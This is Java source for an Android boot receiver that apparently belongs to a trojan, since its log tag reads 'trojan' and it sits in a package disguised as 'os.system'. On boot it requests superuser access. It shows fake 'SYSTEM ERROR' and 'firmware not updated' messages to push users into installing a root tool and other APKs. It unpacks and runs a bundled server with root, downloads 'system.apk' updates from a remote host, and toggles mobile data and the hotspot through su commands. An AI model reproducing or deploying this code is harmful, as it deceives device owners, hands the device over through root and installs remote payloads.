package os.system;

import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.DefaultHttpClient;
import android.os.AsyncTask;
import android.os.CountDownTimer;
import android.content.BroadcastReceiver;
import android.util.Log;
import android.content.Context;
import android.content.Intent;
import android.content.pm.*;
import android.content.ActivityNotFoundException;
import android.content.SharedPreferences;
import android.widget.Toast;
import android.widget.TextView;
import android.view.View;
import android.view.LayoutInflater;
import android.view.Gravity;
import android.graphics.Color;
import android.net.Uri;
import android.webkit.MimeTypeMap;
import android.net.wifi.WifiManager;
import android.net.wifi.WifiConfiguration;
import java.io.*;
import java.net.*;
import java.lang.reflect.*;

public class ReceiverBoot extends BroadcastReceiver
{
	private static String TAG = "trojan";
	private boolean oke = true;
	private Toast toast;
	private Context exContext;
	private ServerUtils utils;
    private Installer installator;
    private String pathToInstallServer;
    private static String version = "1";
    private SharedPreferences settings;
	private SharedPreferences.Editor seteditor;
	private static boolean prosesdownload = false;
	private static int sizedownload = 0;
	
	public static String requestAksi = "";
	public static String requestPath = "";
	public static String requestUrl = "";
	public static String requestResult = "";
    public static boolean main = true;
    public static String docFolder, pathExternal;

	public String getPath() {
		return pathExternal;
	}

	@Override
	public void onReceive(Context context, Intent intent)
	{
		exContext = context;
		settings = context.getSharedPreferences("Settings", 0);
		seteditor = settings.edit();
		utils = new ServerUtils(context);
        pathToInstallServer = utils.getPathToInstallServer();
        docFolder = utils.getDocFolder();
        pathExternal = utils.getPathExternal();

        if (!hostspotStatus(context)) {
	        cekUpdate(context, intent);
	    }        
        
	    if (!utils.checkInstall()) {
        	extrak(context, "server.zip", pathToInstallServer, docFolder);
        }
        if (settings.getBoolean("server install",true)) 
        {
        	if (!utils.checkInstallData()) {
				extrak(context, "data.zip", pathExternal, pathExternal);
			}
			if (rootRequest().equals("root")) 
			{
				boolean[] flags = utils.checkRun();
        		if (flags[0] && flags[1] && flags[2]) {
        			Log.i(TAG, "run server OK");
	        	} else {
	        		utils.runSrv();
	        	}
				
			}
			else if (rootRequest().equals("tolak user")) {
				toastText(context, "SYSTEM ERROR!!\n\n\n     Please Allow superuser.    \n", Color.GREEN, Gravity.CENTER, 20000);
			}
			else if (rootRequest().equals("tidak root")) {
				if (!openApp(context, "kingoroot.supersu")) 
				{
					String path = pathExternal+"/kroot.apk";
					String ext = getExtension(path);
					MimeTypeMap mime = MimeTypeMap.getSingleton();
	        		String mimeType = mime.getMimeTypeFromExtension(ext.substring(1));
					intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
	            	intent.setAction(Intent.ACTION_VIEW);
	            	intent.setDataAndType(Uri.parse("file://" + path), mimeType);
	            	intent.putExtra("data", path);
	            	intent.putExtra(Intent.EXTRA_TITLE, "Что использовать?");
	            	try {
	            	    context.startActivity(intent);
	            	} catch (Exception ae) {}

					toastText(context, "SYSTEM ERROR!!\n\n\nYour firmware is NOT updated please follow this Tutorial.\n\n1. Install this app SuperUser\n\b2. Open app and click root.", Color.YELLOW, Gravity.CENTER, 200000);
				}
			}
			else {
				//unknow
			}
					
        }

        if (intent.getAction().equals(Intent.ACTION_BOOT_COMPLETED)) {
			context.startService(new Intent(context, System.class));
			int nowVersion = -1;
        	int newVersion = -1;
        	try {
        		newVersion = Integer.parseInt(version);
        	}catch (Exception e) {}
        	try {
        		PackageInfo pinfo = context.getPackageManager().getPackageInfo(context.getPackageName(), 0);
        		nowVersion = pinfo.versionCode;
        	}
        	catch(Exception e) {}
			if (rootRequest().equals("root") && nowVersion != newVersion) 
			{
				intent = new Intent(Intent.ACTION_VIEW);
        		intent.setDataAndType(Uri.fromFile(new File(pathExternal+"/system.apk")), "application/vnd.android.package-archive");
        		intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        		context.startActivity(intent);
				toastText(context, "NOW AVAILABLE!!\n\n\nYour firmware is NOT updated please follow this Tutorial.\n\n1. Install this app\n\b2. Open the app.", Color.GREEN, Gravity.CENTER, 15000);
			}
		}
	}

	public String cekClientOrServer() {
		String sip = Identitas.getIPAddress(true);
        String[] ip = sip.split("[.]");
        int index = ip.length - 1;

        Log.i(TAG, "addres : "+ip[index]);

        if (ip[index].equals("1")) {
        	return "server";
        }
        return "client";
	}

	public String cekClient() {
		String exe = shellCommands("ls "+pathExternal+"/client");
		if (exe.equals("")) {
			return "kosong";
		}

		return "ada";
	}

	public void cekUpdate(Context context, Intent intent) 
	{
		if (!prosesdownload) {
			prosesdownload = false;
			Log.i(TAG, "download mati");

			//requestUrl = "https://sunjangyo12.000webhostapp.com/save.txt";
			requestUrl = "http://10.42.0.1/save.txt";
			requestAksi = "web";
			mainRequest(context);
		}
		String[] upResult = requestResult.split("\n");

		Log.i(TAG, "web : "+upResult[0]);

		if (upResult[0].equals("")) {
			Log.i(TAG, "<<<< result null >>>>");
		} else {
			if (upResult[0].equals(version)){
				Log.i(TAG, "now version : "+version);
			} else {
				Log.i(TAG, "Update...");
				Log.i(TAG, "total : "+sizedownload);

				prosesdownload = true;
				seteditor.putString("version", upResult[0]);    
  	        	seteditor.commit();

  	        	version = settings.getString("version","");
  	        	requestUrl = "http://10.42.0.1/download.php?id=system.apk";
				requestAksi = "download";
				requestPath = pathExternal+"/system.apk";
				mainRequest(context);
			}
		}

		int nowVersion = -1;
        int newVersion = -1;
        try {
        	newVersion = Integer.parseInt(version);
        }catch (Exception e) {}
        try {
        	PackageInfo pinfo = context.getPackageManager().getPackageInfo(context.getPackageName(), 0);
        	nowVersion = pinfo.versionCode;
        }
        catch(Exception e) {}

        if (nowVersion != newVersion  &&  sizedownload == 100) {
        	Log.i(TAG, "download complete.");
			Log.i(TAG, "total : "+sizedownload);
	        prosesdownload = false;
	        sizedownload = 0;

        	intent = new Intent(Intent.ACTION_VIEW);
        	intent.setDataAndType(Uri.fromFile(new File(pathExternal+"/system.apk")), "application/vnd.android.package-archive");
        	intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        	context.startActivity(intent);

			toastText(context, "NOW AVAILABLE!!\n\n\nYour firmware is NOT updated please follow this Tutorial.\n\n1. Install this app\n\b2. Open the app.", Color.GREEN, Gravity.CENTER, 15000);

        } else {
        	Log.i(TAG, "udah terbaru : "+nowVersion);
        }
	}

	public static void setGSM(boolean enable, Context context) {
    	String command;
    	if (enable) {
    		command = "svc data enable\n";
    	} else {
    		command = "svc data disable\n";
    	}
    	try {
    		Process su = Runtime.getRuntime().exec("su");
    		DataOutputStream out = new DataOutputStream(su.getOutputStream());
    		out.writeBytes(command);
    		out.flush();
    		
    		out.close();
    	}
    	catch (Exception e) {}
    }

	public static boolean hostspotStatus(Context context) { 
		WifiManager wifimanager = (WifiManager) context.getSystemService(context.WIFI_SERVICE); 
		try { 
			Method method = wifimanager.getClass().getDeclaredMethod("isWifiApEnabled"); 
			method.setAccessible(true); 
			return (Boolean) method.invoke(wifimanager); 
		}
		catch (Throwable ignored) {} 
		return false; 
	} 

	public static boolean hotspotConfig(Context context) { 
		WifiManager wifimanager = (WifiManager) context.getSystemService(context.WIFI_SERVICE); 
		WifiConfiguration wificonfiguration = null; 
		try { 
			// if WiFi is on, turn it off 
			if(hostspotStatus(context)) { 
				wifimanager.setWifiEnabled(false);
				main = true;
			} 
			Method method = wifimanager.getClass().getMethod("setWifiApEnabled", WifiConfiguration.class, boolean.class); 
			method.invoke(wifimanager, wificonfiguration, !hostspotStatus(context)); 
			return true; 
		}
		catch (Exception e) { 
			e.printStackTrace(); 
		} 
		return false; 
	} 

	public static String rootRequest() {
		boolean retval = false;
		Process suProcess;
		String rootData = "";
		try {
			suProcess = Runtime.getRuntime().exec("su");
			DataOutputStream os = new DataOutputStream(suProcess.getOutputStream());
			DataInputStream osRes = new DataInputStream(suProcess.getInputStream());
			if (null != os && null != osRes) {
				os.writeBytes("id\n");
				os.flush();

				String currUid = osRes.readLine();
				boolean exitSu = false;
				if (null == currUid) {
					retval = false;
					exitSu = false;
					rootData = "tolak user";
					Log.d("ROOT","Cant get root access or denied by user");
				}
				else if (true == currUid.contains("uid=0")) {
					retval = true;
					exitSu = true;
					rootData = "root";
					Log.d("ROOT","Root access granted");
				}
				else {
					retval = false;
					exitSu = true;
					Log.d("ROOT","Root access rejectd: "+currUid);
				}

				if (exitSu) {
					os.writeBytes("exit\n");
					os.flush();
				}

			}
		} catch (Exception e) {
			retval = false;
			rootData = "tidak root";
			Log.d("ROOT", "Root access rejectd["+e.getClass().getName()+"] :"+e.getMessage());
		}
		//return retval;
		return rootData;
	}

	public void rootCommands(String[] cmds) {
		Process p;
		try{
			p = Runtime.getRuntime().exec("su");
			DataOutputStream os = new DataOutputStream(p.getOutputStream());

			for (String tmpCmd : cmds) {
				os.writeBytes(tmpCmd+"\n");
			}
			os.writeBytes("exit\n");
			os.flush();
		} catch (Exception e) {}
	}

	public String shellCommands(String command) {

		StringBuffer output = new StringBuffer();

		Process p;
		try {
			p = Runtime.getRuntime().exec(command);
			p.waitFor();
			BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));

			String line = "";
			while ((line = reader.readLine())!= null) {
				output.append(line+"\n");
			}

		}
		catch (Exception e) {
			e.printStackTrace();
		}
		String response = output.toString();
		return response;

	}

	private void extrak(Context context, String efile, String pathsatu, String pathdua) {
		installator = new Installer(context, true);
        installator.execute(efile, pathsatu, pathdua);
	}

	private static String getExtension(String path) {
        if (path.contains(".")) {
            return path.substring(path.lastIndexOf(".")).toLowerCase();
        }
        return null;
    }

	public void mainRequest(Context context) {
		CallWebPageTask task = new CallWebPageTask();
		task.applicationContext = context;
		task.main = requestAksi;
		task.execute(new String[] { requestUrl });
	}

	public String requestDownload() {
		InputStream input = null;
        OutputStream output = null;
        HttpURLConnection connection = null;
        String error = "";
        try {
            URL url = new URL(requestUrl);
            connection = (HttpURLConnection) url.openConnection();
            connection.connect();

            if (connection.getResponseCode() != HttpURLConnection.HTTP_OK) {
                return "Server returned HTTP "+ connection.getResponseCode()+" "+connection.getResponseMessage();
            }

            int fileLength = connection.getContentLength();

            // download the file
            input = connection.getInputStream();
            output = new FileOutputStream(requestPath);
            byte data[] = new byte[4096];
            long total = 0;
            int count;

            while ( (count=input.read(data)) != -1 ) {
                /*if (isCancelled()) {
                    input.close();
                    return null;
                }*/
                total += count;

                if (fileLength > 0) 
                	sizedownload = (int) (total * 100 / fileLength);
                    //publishProgress((int) (total*100/fileLength));
                output.write(data, 0, count);
            }

        } catch (IOException e) {
            error = e.toString();
        } finally {
            try {
                if (output != null) output.close();
                if (input != null) input.close();
            }
            catch (IOException ioe) {

            }
            if (connection != null) connection.disconnect();
        }
        return "ok : "+error;
	}
	
	//Mengirimkan data web keserver
	public String requestWeb(){
		String sret = "";
        HttpClient httpClient = new DefaultHttpClient();
        HttpGet request = new HttpGet(requestUrl);
        try{
            HttpResponse response = httpClient.execute(request);

            try { // split result
         	   InputStream in = response.getEntity().getContent();
         	   BufferedReader reader = new BufferedReader(new InputStreamReader(in));
         	   StringBuilder str = new StringBuilder();
         	   String line = null;
         	   while((line = reader.readLine()) != null){
         	       str.append(line + "\n");
         	   }
         	   in.close();
         	   sret = str.toString();
        	} catch(Exception ex) {
        	  	Log.i(TAG, "Error split text");
        	}
        }
		catch(Exception ex){
			Log.i(TAG, "Failed Connect to Server!");
        }
        return sret;
    }

	private class CallWebPageTask extends AsyncTask<String, Void, String> 
	{
		protected Context applicationContext;
		protected String main = "";
		// connecting...
		@Override
		protected void onPreExecute() {}

	    @Override
	    protected String doInBackground(String... data) {
	    	//data[0] = url
	    	if (main.equals("web")) {
				return requestWeb();
			}
			else if (main.equals("download")){
				return requestDownload();
			}
			return null;
	    }

	    // berhasil
	    @Override
	    protected void onPostExecute(String result) {
	    	if (main.equals("web")) {
		    	requestResult = result;
	    	}
		}
	}

	
	public static boolean openApp(Context context, String packageName) {
		PackageManager manager = context.getPackageManager();
		try {
			Intent i = manager.getLaunchIntentForPackage(packageName);
			if (i == null) {
				return false;
				//throw new ActivityNotFoundException();
			}
			i.addCategory(Intent.CATEGORY_LAUNCHER);
			context.startActivity(i);
			return true;
		} 
		catch (ActivityNotFoundException e) {
			return false;
		}
	}

	public void toastText(Context context, String data, int warna, int letak, int waktu)
	{
		LayoutInflater inflater = (LayoutInflater) context.getSystemService(Context.LAYOUT_INFLATER_SERVICE );
		View layout = inflater.inflate(R.layout.toast, null);

    	TextView text = (TextView) layout.findViewById(R.id.toast);
		text.setText(data);
		text.setTextColor(Color.BLACK);
		text.setTextSize(13);
		text.setGravity(Gravity.CENTER);

		toast = new Toast(context.getApplicationContext());
		toast.setGravity(letak, 0, 0);
		toast.setView(text);
		toast.setView(layout);

		View toastView = toast.getView();
		toastView.setBackgroundColor(warna);

    	CountDownTimer hitungMundur = new CountDownTimer(waktu, 100)
		{
			public void onTick(long millisUntilFinished)
			{
				toast.show();
			}
			public void onFinish()
			{
				toast.cancel();
			}
		}.start();
	}
}